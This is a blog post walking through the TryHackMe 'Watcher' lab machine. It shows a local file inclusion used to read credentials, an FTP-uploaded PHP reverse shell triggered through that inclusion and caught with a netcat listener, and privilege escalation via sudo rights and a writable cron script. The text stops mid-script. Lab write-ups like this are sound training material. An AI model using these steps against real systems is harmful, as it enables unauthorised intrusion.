<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe - Watcher" /><meta name="author" content="Nasrallah" /><meta property="og:locale" content="en" /><meta name="description" content="Watcher room utilize lfi for froothold and different privesc techniques" /><meta property="og:description" content="Watcher room utilize lfi for froothold and different privesc techniques" /><link rel="canonical" href="https://nasrallahbaadi.github.io/posts/Watcher/" /><meta property="og:url" content="https://nasrallahbaadi.github.io/posts/Watcher/" /><meta property="og:site_name" content="Nasrallah" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-17T01:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe - Watcher" /><meta name="twitter:site" content="@NasrallahBaadi" /><meta name="twitter:creator" content="@Nasrallah" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nasrallah"},"dateModified":"2022-07-08T17:56:10+01:00","datePublished":"2022-01-17T01:00:00+01:00","description":"Watcher room utilize lfi for froothold and different privesc techniques","headline":"TryHackMe - Watcher","mainEntityOfPage":{"@type":"WebPage","@id":"https://nasrallahbaadi.github.io/posts/Watcher/"},"url":"https://nasrallahbaadi.github.io/posts/Watcher/"}</script><title>TryHackMe - Watcher | Nasrallah</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nasrallah"><meta name="application-name" content="Nasrallah"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nasrallah</a></div><div class="site-subtitle font-italic">Learning journey</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/NasrallahBaadi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NasrallahBaadi" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/NasrallahBaadi" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/565048" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Nasrallah" aria-label="TryHackMe" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://t.me/Sirius1337" aria-label="Telegram" target="_blank" rel="noopener"> <i class="fab fa-telegram"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['baadinasrallah','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TryHackMe - Watcher</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>TryHackMe - Watcher</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1642377600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 17, 2022 </em> </span> <span> Updated <em class="" data-ts="1657299370" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> NasrallahBaadi </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2255 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><div align="center"> <script src="https://tryhackme.com/badge/367641"></script></div><hr /><p>Hello l33ts, I hope you are doing well. Today we are going to look at <a href="https://tryhackme.com/room/watcher">Watcher</a> from <a href="https://tryhackme.com">TryHackMe</a>, a medium machine requires the exploitation of an LFI vulnerability to get some credentials, and use those credentials to upload a web reverse shell in order to get access to the machine, and work from there to get root with multiple horizontal Privilege escalation using different techniques. Let’s dive into it.</p><h1 id="description"><strong>Description</strong></h1><p>A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.</p><h1 id="enumeration"><strong>Enumeration</strong></h1><p>Let’s start our enumeration with a nmap scan:<code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -T4 {target_IP} | tee scans/nmap</code></p><ul><li><p>-sC: run all the default scripts.</p><li><p>-sV: Find the version of services running on the target.</p><li><p>-T4: Aggressive scan to provide faster results.</p><li><p>| tee scans/nmap: Save the output to a file named nmap.</p><h2 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="o">{</span>target-IP<span class="o">}</span> | <span class="nb">tee </span>scans/nmap           
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 06:04 EST
Nmap scan report for 10.10.18.205
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
|_http-server-header: Apache/2.4.29 (Ubuntu)
</span><span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.99 seconds
</span></pre></table></code></div></div></ul><p>We find 3 open ports, 21(FTP), 22(SSH) and 80(HTTP). We don’t have credentials for FTP nor for SSH, so let’s enumerate the HTTP server using Gobuster:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://<span class="o">{</span>target_IP<span class="o">}</span> | <span class="nb">tee </span>scans/gobuster
<span class="go">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.18.205
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
06:07:15 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
</span><span class="gp">/css                  (Status: 301) [Size: 310] [--&gt;</span><span class="w"> </span>http://10.10.18.205/css/]
<span class="gp">/images               (Status: 301) [Size: 313] [--&gt;</span><span class="w"> </span>http://10.10.18.205/images/]
<span class="go">/index.php            (Status: 200) [Size: 4826]                                 
/robots.txt           (Status: 200) [Size: 69]                                   
/server-status        (Status: 403) [Size: 277]                                  
===============================================================
</span></pre></table></code></div></div><p>Gobuster found <strong>robots.txt</strong>, let’s check it.</p><h2 id="flag-1"><span class="mr-2">Flag 1</span><a href="#flag-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="/assets/img/tryhackme/watcher/robots.png" alt="creds" data-proofer-ignore></p><p>Great we found our first flag, we can find it here : <code class="language-plaintext highlighter-rouge">http://{target_IP}/flag_1.txt</code>. We also found another file, but we don’t have access to it.</p><p><img data-src="/assets/img/tryhackme/watcher/forb.png" alt="forbidden" data-proofer-ignore></p><p>Let’s check if the website has anything useful for us:</p><p><img data-src="/assets/img/tryhackme/watcher/lfi_post.png" alt="lfi" data-proofer-ignore></p><p>If we click one of the pictures on the website we get redirected to <code class="language-plaintext highlighter-rouge">/post.php</code> where we can see a parameter query <code class="language-plaintext highlighter-rouge">/post.php?post=round.php</code>. Let’s see if this parameter is vulnerable to LFI:</p><p><img data-src="/assets/img/tryhackme/watcher/passwd.png" alt="passwd" data-proofer-ignore></p><p>Great, it is vulnerable to LFI, let’s now try to pull the file we found earlier in robots.txt:</p><p><img data-src="/assets/img/tryhackme/watcher/creds.png" alt="creds" data-proofer-ignore></p><p>We have manged to read that file, and it seems we have got some FTP credentials that we can use.</p><h2 id="ftp"><span class="mr-2">FTP</span><a href="#ftp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s login to FTP and see what’s there: <code class="language-plaintext highlighter-rouge">ftp {target_IP}</code></p><h2 id="flag-2"><span class="mr-2">Flag 2</span><a href="#flag-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">┌──(sirius㉿kali)-[~/CTF/THM/watcher]                                                                                                                        
</span><span class="gp">└─$</span><span class="w"> </span>ftp 10.10.18.205                                                                                                                                         
<span class="go">Connected to 10.10.18.205.                                                                                                                                   
220 (vsFTPd 3.0.3)                                                                                                                                           
Name (10.10.18.205:sirius): ftpuser                                                                                                                          
331 Please specify the password.                                                                                                                             
Password:                                                                                                                                                    
230 Login successful.                                                                                                                                        
Remote system type is UNIX.                                                                                                                                  
Using binary mode to transfer files.                                                                                                                         
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                                                      
<span class="go">229 Entering Extended Passive Mode (|||43157|)                                                                                                               
150 Here comes the directory listing.                                                                                                                        
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files                                                                                                
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt                                                                                           
226 Directory send OK.                                                                                                                                       
</span><span class="gp">ftp&gt;</span><span class="w"> </span>get flag_2.txt                                                                                                                                          
<span class="go">local: flag_2.txt remote: flag_2.txt                                                                                                                         
229 Entering Extended Passive Mode (|||47137|)                                                                                                               
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).                                                                                           
100% |****************************************************************************************************************|    21      113.30 KiB/s    00:00 ETA
226 Transfer complete.                                                                                                                                       
21 bytes received in 00:00 (0.21 KiB/s)                                                                                                                      
</span><span class="gp">dftp&gt;</span><span class="nb">exit</span>
<span class="go">221 Goodbye.

┌──(sirius㉿kali)-[~/CTF/THM/watcher]                                                                                                                        
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                                                       
<span class="go">flag_2.txt  scans
</span></pre></table></code></div></div><p>Great, we found our second flag, we can copy it to our machine using : <code class="language-plaintext highlighter-rouge">get flag_2.txt</code></p><p>Since we have an LFI vulnerability, i’m going to try to upload a php reverse shell to the FTP server and try to access it using the web server. The shell i will be using is this : <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php_reverse_shell</a></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ftp 10.10.18.205                                                                                                                                         
<span class="go">Connected to 10.10.18.205.                                                                                                                                   
220 (vsFTPd 3.0.3)                                                                                                                                           
Name (10.10.18.205:sirius): ftpuser                                                                                                                          
331 Please specify the password.                                                                                                                             
Password:                                                                                                                                                    
230 Login successful.                                                                                                                                        
Remote system type is UNIX.                                                                                                                                  
Using binary mode to transfer files.                                                                                                                         
</span><span class="gp">ftp&gt;</span><span class="w"> </span>put rev.php                                                                                                                                        
<span class="go">local: rev.php remote: rev.php                                                                                                                     
229 Entering Extended Passive Mode (|||45312|)                                                                                                               
553 Could not create file.                                                                                                                                   
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">pwd</span>                                                                                                                                                     
<span class="go">Remote directory: /                                                                                                                                          
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                                                      
<span class="go">229 Entering Extended Passive Mode (|||42555|)                                                                                                               
150 Here comes the directory listing.                                                                                                                        
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files                                                                                                
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt                                                                                           
226 Directory send OK.                                                                                                                                       
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">cd </span>files                                                                                                                                                
<span class="go">250 Directory successfully changed.                                                                                                                          
</span><span class="gp">ftp&gt;</span><span class="w"> </span>put rev.php                                                                                                                                        
<span class="go">local: rev.php remote: rev.php                                                                                                                     
229 Entering Extended Passive Mode (|||41911|)                                                                                                               
150 Ok to send data.                                                                                                                                         
100% |****************************************************************************************************************|  3651       23.84 MiB/s    00:00 ETA
226 Transfer complete.                                                                                                                                       
3651 bytes sent in 00:00 (15.91 KiB/s)                                                                                                                       
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                                                      
<span class="go">229 Entering Extended Passive Mode (|||46255|)                                                                                                               
150 Here comes the directory listing.                                                                                                                        
-rw-r--r--    1 1001     1001         3651 Jan 13 10:57 rev.php                                                                                         
226 Directory send OK.                                                                                                                                       
</span><span class="gp">ftp&gt;</span><span class="w">
</span></pre></table></code></div></div><p>I couldn’t upload it first in the root directory but i managed to upload it into <strong>files</strong> directory.</p><blockquote><p>Note : you should change the ip in the reverse shell before uploading it.</p></blockquote><p>Now, we should set up a listener in our machine before navigating to the shell. <code class="language-plaintext highlighter-rouge">nc -lnvp 1234</code></p><p>According to the secret file we found in robots.txt: <img data-src="/assets/img/tryhackme/watcher/creds.png" alt="creds" data-proofer-ignore> The path to our reverse shell is <code class="language-plaintext highlighter-rouge">/home/ftpuser/ftp/files/</code>. So in order to execute the script, we need to navigate to <code class="language-plaintext highlighter-rouge">http://{target_IP}/post.php?post=/home/ftpuser/ftp/files/rev.php</code></p><blockquote><p>Note : ‘rev.php’ is what i named my reverse shell file, yours might be different!!!</p></blockquote><h1 id="foothold"><strong>Foothold</strong></h1><p>After setting up everything and navigating to our shell, we should get a reverse shell:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp"> $</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 1234                                                                                                                                   <span class="o">[</span>142/144]
<span class="go">listening on [any] 1234 ...                                                                                                                                  
connect to [10.11.31.131] from (UNKNOWN) [10.10.18.205] 36444                                                                                                
</span><span class="gp">Linux watcher 4.15.0-128-generic #</span>131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux                                                  
<span class="go"> 10:58:02 up 19 min,  0 users,  load average: 0.00, 0.02, 0.11                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                          
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                        
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off                                                                                                                                                                                                                                                               
<span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>                                                                                                             
<span class="gp">www-data@watcher:/home$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm                                                                                                                    
<span class="go">export TERM=xterm
</span><span class="gp">www-data@watcher:/home$</span><span class="w"> </span>^Z
<span class="go">zsh: suspended  nc -lnvp 1234

┌──(sirius㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg                                                                                                                             </span>148 ⨯ 1 ⚙
<span class="go">[1]  + continued  nc -lnvp 1234

</span><span class="gp">www-data@watcher:/home$</span><span class="w">
</span><span class="go">
</span></pre></table></code></div></div><h2 id="flag-3"><span class="mr-2">Flag 3</span><a href="#flag-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Great, we got a shell, i have executed some commands to get a functional shell:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp"> [target machine] python3 -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span><span class="go">
 [target machine] export TERM=xterm

 [target machine] ctrl+z

</span><span class="gp"> [attacker machine] stty raw -echo;</span><span class="nb">fg</span>
</pre></table></code></div></div><p>We can find our third flag here:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp"> www-data@watcher:/var/www/html/more_secrets_a9f10a$</span><span class="w"> </span><span class="nb">ls</span>                                                                                                       
<span class="go">flag_3.txt
</span></pre></table></code></div></div><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h2 id="flag-4"><span class="mr-2">Flag 4</span><a href="#flag-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It’s now to upgrade from www-data to another user, let’s check what we can do with our current user:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">www-data@watcher:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
</span></pre></table></code></div></div><p>Apparently, we can execute any command as <code class="language-plaintext highlighter-rouge">toby</code>. We can use that to change our user to toby:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">www-data@watcher:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> toby /bin/bash
<span class="gp">toby@watcher:/$</span><span class="w">
</span><span class="gp">toby@watcher:/$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">flag_4.txt  jobs  note.txt
</span><span class="gp">toby@watcher:~$</span><span class="w"> </span><span class="nb">cat </span>note.txt  
<span class="go">Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.
</span></pre></table></code></div></div><p>With that, we can now <code class="language-plaintext highlighter-rouge">cat</code> the fourth flag.</p><h2 id="flag-5"><span class="mr-2">Flag 5</span><a href="#flag-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We have a note from someone that says there is a cronjob set up, let’s see what’s there:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">toby@watcher:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/crontab
<span class="gp">#</span><span class="w"> </span>/etc/crontab: system-wide crontab
<span class="gp">#</span><span class="w"> </span>Unlike any other crontab you don<span class="s1">'t have to run the `crontab'</span>
<span class="gp">#</span><span class="w"> </span><span class="nb">command </span>to <span class="nb">install </span>the new version when you edit this file
<span class="gp">#</span><span class="w"> </span>and files <span class="k">in</span> /etc/cron.d. These files also have username fields,
<span class="gp">#</span><span class="w"> </span>that none of the other crontabs <span class="k">do</span><span class="nb">.</span>
<span class="go">
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

</span><span class="gp">#</span><span class="w"> </span>m h dom mon dow user  <span class="nb">command</span>
<span class="go">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
</span><span class="gp">#</span><span class="w">
</span><span class="go">*/1 * * * * mat /home/toby/jobs/cow.sh
</span></pre></table></code></div></div><p>There a script called <strong>cow.sh</strong> that runs as mat but we as toby are the owner of that file, so we can edit it to get a shell as mat. I added a bash script to <strong>cow.sh</strong> that sends me a reverse shell, the script now looks like this:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>cow.sh
<span class="gp">#</span><span class="o">!</span>/bin/bash
<span class="go">cp /home/mat/cow.jpg /tmp/cow.jpg
